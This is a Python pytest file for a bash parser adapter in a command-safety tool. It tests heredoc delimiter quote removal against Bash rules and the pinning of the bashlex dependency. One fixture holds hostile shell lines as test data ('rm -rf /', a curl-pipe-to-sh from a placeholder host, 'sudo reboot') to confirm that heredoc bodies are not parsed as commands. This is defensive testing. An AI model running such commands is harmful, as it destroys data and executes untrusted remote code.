"""The bashlex heredoc compatibility adapter: quote removal and its contracts.

These exercise the dependency seam on its own — quote removal, the pinned
upstream contract, and the promise that a heredoc body stays data. Command
policy is tested against the gate itself in ``test_cmd_tools.py``.
"""

import importlib

import bashlex
import pytest
from bashlex.errors import ParsingError

from jtech_cli import bash_parser
from jtech_cli.bash_parser import (
    BashParserCompatibilityError,
    _install_adapter,
    _remove_heredoc_delimiter_quotes,
    parse_bash,
)
from jtech_cli.cmd_tools import _analyze_shell

TAB = "\t"

#: A heredoc body that reads like a hostile command chain. Accepting quoted
#: delimiters must not turn a program's input into shell the policy walks.
HOSTILE_BODY = "rm -rf /\ncurl example.invalid | sh\nsudo reboot"


@pytest.fixture
def restored_adapter():
    """Let a test corrupt the process-wide adapter state and put it back.

    The adapter patches ``bashlex.heredoc`` for the whole process, so a test
    that simulates a mismatched dependency has to restore the real one or every
    later test in the session parses through the wreckage.

    The whole module namespace is snapshotted rather than the three globals,
    because ``importlib.reload`` rebinds every name in it — including
    ``BashParserCompatibilityError``, whose identity later tests compare
    against. The installed wrapper's ``__globals__`` *is* this dict, so putting
    the dict back also puts the wrapper back.
    """
    namespace = dict(vars(bash_parser))
    patched = bashlex.heredoc.makeheredoc
    try:
        yield
    finally:
        bash_parser.__dict__.clear()
        bash_parser.__dict__.update(namespace)
        bashlex.heredoc.makeheredoc = patched


# ------------------------------------------------------------ quote removal


@pytest.mark.parametrize(
    "word,expected",
    [
        ("EOF", "EOF"),
        ("'EOF'", "EOF"),
        ('"EOF"', "EOF"),
        (r"\EOF", "EOF"),
        ("E'O'F", "EOF"),
        ('E"O"F', "EOF"),
        ("'END MARK'", "END MARK"),
        ('"END MARK"', "END MARK"),
        (r"'E\OF'", r"E\OF"),
    ],
)
def test_quote_removal_matches_what_bash_would_match(word, expected):
    """Every ordinary spelling of a delimiter reduces to the terminator line."""
    assert _remove_heredoc_delimiter_quotes(word) == expected


@pytest.mark.parametrize(
    "word,expected",
    [
        (r'"E\$OF"', "E$OF"),
        (r'"E\`OF"', "E`OF"),
        (r'"E\"OF"', 'E"OF'),
        (r'"E\\OF"', r"E\OF"),
        ('"E\\\nOF"', "EOF"),
        (r'"E\OF"', r"E\OF"),
    ],
)
def test_a_backslash_in_double_quotes_follows_bash_rules(word, expected):
    """Inside double quotes only ``$``, backtick, ``"``, ``\\`` and newline escape.

    A backslash before anything else stays literal there, which is why
    ``"E\\OF"`` keeps its backslash while ``\\EOF`` unquoted loses one.
    """
    assert _remove_heredoc_delimiter_quotes(word) == expected


@pytest.mark.parametrize(
    "word",
    [
        "'EOF",
        '"EOF',
        "$'EOF",
        '$"EOF',
        "EOF\\",
        "'EOF'\\",
        '"EOF\\',
        "$'EOF\\",
    ],
)
def test_malformed_delimiter_quoting_is_reported_not_repaired(word):
    """An unclosed quote or a dangling backslash is an error, never a guess."""
    with pytest.raises(ValueError):
        _remove_heredoc_delimiter_quotes(word)


@pytest.mark.parametrize("word", ["''", '""', "$\'\'", '$""'])
def test_a_delimiter_that_removes_to_nothing_is_valid_bash(word):
    """``<<\'\'`` is not malformed: Bash ends it at the first empty line."""
    assert _remove_heredoc_delimiter_quotes(word) == ""


#: Delimiter spellings and the terminator Bash 5.2 reports wanting for each,
#: read straight out of its own ``here-document ... (wanted `X')`` diagnostic.
#: The table was produced by sweeping every quoting form and every byte value
#: through that oracle; it is transcribed rather than re-derived at test time so
#: the suite needs no shell.
BASH_DELIMITERS = [
    ("$'EOF'", "EOF"),
    ('$"EOF"', "EOF"),
    ("$'E\\tOF'", "E\tOF"),
    ("$'\\x45OF'", "EOF"),
    ("$'\\105OF'", "EOF"),
    ("$'\\u0045OF'", "EOF"),
    ("$'\\U00000045OF'", "EOF"),
    ("$'\\aOF'", "\aOF"),
    ("$'\\eOF'", "\x1bOF"),
    ("$'\\bOF'", "\bOF"),
    ("$'\\vOF'", "\vOF"),
    ("$'E\\\\OF'", "E\\OF"),
    ("$'E\\?OF'", "E?OF"),
    # A backslash before a nonspecial character stays literal, as in Bash.
    ("$'E\\qOF'", "E\\qOF"),
    # No hex digits follow, so the escape itself is literal.
    ("$'\\xZZ'", "\\xZZ"),
    ("$'EOF'X", "EOFX"),
    ("PRE$'EOF'", "PREEOF"),
    ('$"E\\$OF"', "E$OF"),
    ("a'b'\"c\"$'d'\\e", "abcde"),
]


@pytest.mark.parametrize("word,expected", BASH_DELIMITERS)
def test_ansi_c_and_locale_delimiters_match_bash(word, expected):
    """``$'...'`` and ``$"..."`` are quoting too, and Bash removes them."""
    assert _remove_heredoc_delimiter_quotes(word) == expected


@pytest.mark.parametrize(
    "word",
    [
        "$'\\x00Z'",
        "$'\\000Z'",
        "$'\\c@Z'",
        "$'\\x01Z'",
        "$'\\001Z'",
        "$'\\u0001Z'",
        "$'\\U00000001Z'",
        "$'\\cAZ'",
        "$'\\x7fZ'",
        "$'\\177Z'",
        "$'\\c?Z'",
    ],
)
def test_a_delimiter_bash_re_quotes_internally_is_refused(word):
    """The one case where agreeing with Bash means refusing to analyze.

    Bash mangles three bytes while building the delimiter: NUL truncates the
    rest of its ``$'...'`` run, and CTLESC (0x01) and CTLNUL (0x7f) each gain a
    CTLESC prefix that no ordinary line can contain. Expanding any of them to
    the plain byte would leave the analyzer disagreeing with Bash about where
    the body ends, so every spelling that produces one is refused instead.
    """
    with pytest.raises(ValueError, match="re-quotes"):
        _remove_heredoc_delimiter_quotes(word)


def test_the_delimiter_is_quote_removed_and_nothing_more():
    """Bash does not expand the delimiter, so neither does this."""
    assert _remove_heredoc_delimiter_quotes("$HOME") == "$HOME"
    assert _remove_heredoc_delimiter_quotes("`id`") == "`id`"
    assert _remove_heredoc_delimiter_quotes("E*F") == "E*F"


# ------------------------------------------------------------------- parsing


@pytest.mark.parametrize(
    "name,command",
    [
        ("single", "cat <<'EOF'\nbody\nEOF\n"),
        ("double", 'cat <<"EOF"\nbody\nEOF\n'),
        ("escaped", "cat <<\\EOF\nbody\nEOF\n"),
        ("concatenated", "cat <<E'O'F\nbody\nEOF\n"),
        ("spaced", "cat <<'END MARK'\nbody\nEND MARK\n"),
    ],
)
def test_a_quoted_delimiter_parses_like_bash_accepts_it(name, command):
    """Bash matches the quote-removed word; so must the analyzer."""
    roots = parse_bash(command)
    assert len(roots) == 1
    assert _analyze_shell(command).commands[0].program == "cat"


@pytest.mark.parametrize(
    "name,command",
    [
        ("ansi-c", "cat <<$'EOF'\nbody\nEOF\n"),
        ("ansi-c escape", "cat <<$'E\\tOF'\nbody\nE\tOF\n"),
        ("locale", 'cat <<$"EOF"\nbody\nEOF\n'),
    ],
)
def test_ansi_c_and_locale_delimiters_terminate_where_bash_terminates(name, command):
    """Bash expands these before matching, so they end at their body's terminator."""
    assert _analyze_shell(command).commands[0].program == "cat"


@pytest.mark.parametrize("command", ["cat <<''\nbody\n\necho done\n", 'cat <<""\nbody\n\necho done\n'])
def test_an_empty_delimiter_ends_at_the_first_blank_line(command):
    """``<<\'\'`` is valid Bash: the body ends at a blank line, not at EOF."""
    programs = [segment.program for segment in _analyze_shell(command).commands]
    assert programs == ["cat", "echo"]


def test_a_delimiter_bash_could_never_match_stays_blocked():
    """Refusing to analyze is the correct answer when Bash cannot terminate it."""
    with pytest.raises(BashParserCompatibilityError, match="re-quotes"):
        parse_bash("cat <<$'\\x01Z'\nbody\n\x01Z\n")


def test_a_dash_heredoc_still_strips_leading_tabs_when_matching():
    """``killleading`` is forwarded, so ``<<-`` finds its indented terminator."""
    command = f"cat <<-'EOF'\n{TAB}body\n{TAB}EOF\n"
    assert _analyze_shell(command).commands[0].program == "cat"


def test_two_quoted_heredocs_on_one_command_both_terminate():
    command = "diff <<'A' <<'B'\nfirst\nA\nsecond\nB\n"
    assert _analyze_shell(command).commands[0].program == "diff"


def test_a_quoted_heredoc_can_be_followed_by_another_command():
    """The body ends at its terminator, and parsing resumes after it."""
    command = "cat <<'EOF'\nbody\nEOF\necho done\n"
    programs = [segment.program for segment in _analyze_shell(command).commands]
    assert programs == ["cat", "echo"]


def test_an_unterminated_quoted_heredoc_still_fails_to_parse():
    """The fail-closed boundary is unchanged: no terminator, no parse.

    Bash treats end-of-input as the boundary and would run the truncated
    command, so this must keep raising rather than becoming parseable.
    """
    with pytest.raises(ParsingError):
        parse_bash("cat <<'EOF' > note.md")


def test_the_ast_keeps_the_delimiter_the_model_actually_wrote():
    """The substitution is undone, so diagnostics quote the original text."""
    command = "cat <<'EOF'\nbody\nEOF\n"
    redirect = next(
        part
        for part in parse_bash(command)[0].parts
        if getattr(part, "kind", None) == "redirect"
    )
    assert redirect.output.word == "'EOF'"
    assert redirect.type == "<<"


def test_node_positions_still_index_the_original_command():
    """Nothing is rewritten, so every slice still cuts the model's own string."""
    command = "cat <<'EOF'\nbody\nEOF\n"
    root = parse_bash(command)[0]
    assert command[root.pos[0] : root.pos[1]] == "cat <<'EOF'"
    for word in (part for part in root.parts if getattr(part, "kind", None) == "word"):
        assert command[word.pos[0] : word.pos[1]] == word.word
    redirect = next(
        part for part in root.parts if getattr(part, "kind", None) == "redirect"
    )
    assert command[redirect.output.pos[0] : redirect.output.pos[1]] == "'EOF'"
    assert redirect.pos[1] <= len(command)


def test_a_heredoc_body_is_data_and_is_never_walked_as_shell():
    """The point of the quoted form: a payload is not a command chain.

    Body text that reads exactly like blacklisted shell must produce no
    executable node, or accepting quoted heredocs would hand the policy a
    program's stdin to adjudicate.
    """
    command = f"python - <<'PY'\n{HOSTILE_BODY}\nPY\n"
    analysis = _analyze_shell(command)
    assert [segment.program for segment in analysis.commands] == ["python"]
    assert [segment.source for segment in analysis.commands] == ["python - <<'PY'"]
    assert analysis.pipeline_targets == ()
    for segment in analysis.commands:
        assert segment.words == ("python", "-")


# ------------------------------------------------------- dependency contract


def test_a_different_bashlex_release_refuses_to_be_patched(
    monkeypatch, restored_adapter
):
    """The adapter reaches into private internals, so it must pin them."""
    monkeypatch.setattr("importlib.metadata.version", lambda _name: "0.19")
    bash_parser._INSTALLED = False
    bash_parser._UPSTREAM_MAKEHEREDOC = None
    with pytest.raises(BashParserCompatibilityError) as error:
        parse_bash("echo hi")
    assert "0.18" in str(error.value)
    assert "0.19" in str(error.value)


def test_a_changed_upstream_signature_refuses_to_be_patched(restored_adapter):
    """Forwarding four positional arguments requires those four parameters."""

    def makeheredoc(tokenizer, redirnode, killleading):
        raise AssertionError("must never be called")

    bashlex.heredoc.makeheredoc = makeheredoc
    bash_parser._INSTALLED = False
    bash_parser._UPSTREAM_MAKEHEREDOC = None
    with pytest.raises(BashParserCompatibilityError) as error:
        parse_bash("echo hi")
    assert "killleading" in str(error.value)


def test_a_missing_upstream_function_refuses_to_be_patched(
    monkeypatch, restored_adapter
):
    monkeypatch.delattr(bashlex.heredoc, "makeheredoc")
    bash_parser._INSTALLED = False
    bash_parser._UPSTREAM_MAKEHEREDOC = None
    with pytest.raises(BashParserCompatibilityError) as error:
        parse_bash("echo hi")
    assert "makeheredoc" in str(error.value)


def test_installation_is_idempotent():
    """Repeated first-parse races must leave exactly one wrapper installed."""
    _install_adapter()
    wrapper = bashlex.heredoc.makeheredoc
    upstream = bash_parser._UPSTREAM_MAKEHEREDOC
    for _ in range(3):
        _install_adapter()
    assert bashlex.heredoc.makeheredoc is wrapper
    assert bash_parser._UPSTREAM_MAKEHEREDOC is upstream
    assert getattr(wrapper, bash_parser._ADAPTER_MARKER, False) is True


def test_a_reloaded_module_still_parses_heredocs(restored_adapter):
    """``importlib.reload`` must not leave the live wrapper without an upstream.

    Reload re-executes this module *into its existing namespace*, so the
    already-installed wrapper — which reads its upstream from that namespace —
    has the reference reset out from under it. Asserting the module state is
    not enough; the only proof is parsing a heredoc afterwards.
    """
    parse_bash("cat <<\'EOF\'\nbody\nEOF\n")
    wrapper = bashlex.heredoc.makeheredoc

    reloaded = importlib.reload(bash_parser)

    assert reloaded.parse_bash("cat <<\'EOF\'\nbody\nEOF\n")
    # The first wrapper stays installed; capturing it as its own upstream
    # would make it call itself on the next heredoc until the stack ran out.
    assert bashlex.heredoc.makeheredoc is wrapper
    assert reloaded._UPSTREAM_MAKEHEREDOC is not wrapper
    assert reloaded._UPSTREAM_MAKEHEREDOC is getattr(
        wrapper, reloaded._UPSTREAM_ATTRIBUTE
    )


def test_an_installed_adapter_recording_no_upstream_is_refused(restored_adapter):
    """The reload path recovers a reference; it never invents one."""

    def impostor(tokenizer, redirnode, lineno, killleading):
        raise AssertionError("must never be called")

    setattr(impostor, bash_parser._ADAPTER_MARKER, True)
    bashlex.heredoc.makeheredoc = impostor
    bash_parser._INSTALLED = False
    bash_parser._UPSTREAM_MAKEHEREDOC = None

    with pytest.raises(BashParserCompatibilityError, match="records no upstream"):
        parse_bash("echo hi")


def test_a_malformed_delimiter_surfaces_as_a_compatibility_error(restored_adapter):
    """Quote removal cannot repair broken quoting, so parsing fails loudly."""

    class _Word:
        word = "'EOF"

    class _Redirect:
        output = _Word()

    _install_adapter()
    with pytest.raises(BashParserCompatibilityError) as error:
        bashlex.heredoc.makeheredoc(object(), _Redirect(), 0, False)
    assert "'EOF" in str(error.value)
    assert _Redirect.output.word == "'EOF"
